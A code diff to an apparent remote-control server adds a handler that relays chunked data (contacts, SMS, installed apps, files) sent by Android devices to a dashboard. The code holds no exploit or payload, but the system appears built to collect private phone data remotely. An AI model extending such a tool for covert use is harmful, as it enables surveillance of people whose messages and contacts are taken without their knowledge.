@@ -740,6 +740,17 @@ async function processMessage(clientId, clientType, event, data) {
         return;
     }
 
+    // ── Chunked data stream from Android (contacts, SMS, apps, files…) ─────────
+    // The device sends many small "data:chunk" events instead of one huge payload
+    // so the dashboard can render data progressively and the 45 s timer is never hit.
+    if (event === 'data:chunk') {
+        const conn = tcpClients.get(clientId);
+        const deviceId = conn?.deviceId;
+        if (!deviceId || !data?.commandId) return;
+        broadcastDash('data:chunk', { ...data, deviceId });
+        return;
+    }
+
     log('MSG', `Unhandled event: ${event}`, 'warn');
 }
 
